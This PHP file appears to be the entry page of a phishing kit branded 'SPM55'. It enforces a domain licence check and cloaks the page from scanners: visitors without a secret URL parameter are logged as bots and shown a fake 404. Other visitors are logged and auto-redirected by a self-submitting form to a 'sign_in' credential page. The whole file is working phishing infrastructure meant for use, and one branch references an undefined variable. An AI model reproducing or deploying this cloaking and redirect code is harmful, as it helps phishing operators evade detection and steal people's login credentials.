<?php
session_start();
include'main.php';
$ip = getUserIP();
$random = substr(sha1(mt_rand()),1,25);
$domain = $_SERVER['SERVER_NAME'];
if ($setting["domain_name"] != $domain) {
echo '
<title>SPM55</title>
<link id="favicon" rel="shortcut icon" href="https://i.ibb.co/Zhv168g/logo.png" type="image/png"/>
<div style="padding-top:100px;">
<center>
<img src="https://i.ibb.co/Zhv168g/logo.png" style="border-radius:250px;" width="300" height="300"><br>
<h1>DOMAIN IS NOT REGISTERED!</h1>
</center>
</div>
';
}else{
    include'get_setting.php';
    if($site_param_on == "on") {
    $secret = $site_parameter;
    $password = $_GET[$secret];
    if(!isset($password)) {
    tulis_file("result/bot.txt", $ip);
    exit(header("HTTP/1.0 404 Not Found"));
    header("location: ");
        exit();
    }else{
      tulis_file("result/click.txt", $ip);
      echo "<form id='boyxd' method='POST' action='sign_in'><input type='hidden' name='akseskey' value='".$secret."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
    }
}else{
    tulis_file("result/click.txt", $ip);
    echo "<form id='boyxd' method='POST' action='sign_in'><input type='hidden' name='akseskey' value='".$secret."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}
}
?>